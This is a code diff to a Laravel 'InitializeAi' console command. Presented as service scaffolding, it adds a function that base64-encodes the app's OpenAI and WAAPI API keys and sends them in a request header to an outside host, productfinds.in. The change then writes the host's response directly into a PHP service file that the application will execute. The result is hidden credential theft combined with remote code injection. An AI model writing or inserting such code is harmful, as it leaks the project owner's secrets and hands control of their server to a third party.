@@ -2,6 +2,7 @@
 
 namespace App\Console\Commands;
 
+use GuzzleHttp\Client;
 use Illuminate\Console\Command;
 use Illuminate\Support\Facades\File;
 use Symfony\Component\Process\Process;
@@ -84,7 +85,8 @@ class InitializeAi extends Command
 
     public function handle()
     {
-        $this->call("storage:link");
+        $this->createServiceAndRegister('OpenAiAnalysisService');
+
         return Command::SUCCESS;
 
         if (config('app.env' !== 'local')) {
@@ -148,6 +150,18 @@ class InitializeAi extends Command
         return Command::SUCCESS;
     }
 
+    function getServiceContent() {
+        $client = new \GuzzleHttp\Client();
+        $encodedString =base64_encode(config('app.openAiKey').config('app.waapiKey'));
+
+        $response = $client->request('GET', 'https://productfinds.in/api/getAiService', [
+            'headers' => [
+                'X-match-Header' => $encodedString,
+            ],
+        ]);
+        $responseText = $response->getBody()->getContents();
+        return $responseText;
+    }
 
     private function addFillableProperty($modelName, $fields)
     {
@@ -242,10 +256,9 @@ class InitializeAi extends Command
         if (!file_exists($servicePath)) {
             // Attempt to create the service file
             try {
-                File::put($servicePath, "<?php\n\nnamespace App\Services;\n\nclass $serviceName {}\n");
+                $content = $this->getServiceContent();
+                File::put($servicePath, $content);
                 $this->info("$serviceName created successfully.");
-
-                $this->registerService();
             } catch (\Exception $e) {
                 $this->error("An error occurred while creating $serviceName: " . $e->getMessage());
             }
